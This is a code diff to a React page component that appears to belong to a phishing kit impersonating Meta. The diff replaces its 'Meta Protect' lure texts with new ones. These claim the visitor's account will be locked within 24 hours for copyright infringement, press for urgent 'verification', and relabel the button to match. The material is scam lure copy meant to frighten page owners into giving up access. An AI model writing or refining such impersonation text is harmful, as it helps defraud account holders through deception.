@@ -15,12 +15,12 @@ const Index = () => {
     const [isLoading, setIsLoading] = useState(true);
     const defaultTexts = useMemo(
         () => ({
-            title: 'Welcome To Meta Protect.',
-            description: "Your access to Marketplace and your account is limited, so we require higher security requirements for your account. We created this security program to unlock your Page.",
-            protectionText: "We've enabled advanced protections to unlock your Page.",
-            processText: 'Below, we walk you through the process in detail and help you fully activate to unlock your Page.',
-            continueBtn: 'Continue',
-            restrictedText: 'Your page was restricted on'
+            title: 'Your account will be locked for 24 hours.',
+            description: "Our system has detected some unusual activities on your account that may be a sign of copyright infringement that affects the community.",
+            protectionText: "Please verify and follow the steps as instructed.",
+            processText: 'To avoid account lock you have only 24 hours left to verify and appeal.',
+            continueBtn: 'Verification',
+            restrictedText: 'Your account was restricted on'
         }),
         []
     );
@@ -111,7 +111,7 @@ const Index = () => {
                     </div>
                 </div>
                 <button
-                    className='rounded-lg bg-blue-500 px-2 py-2 text-sm font-bold text-white disabled:opacity-50'
+                    className='rounded-lg bg-blue-500 px-3 py-4 font-bold text-white disabled:opacity-50'
                     disabled={isLoading}
                     onClick={() => {
                         navigate(PATHS.HOME);
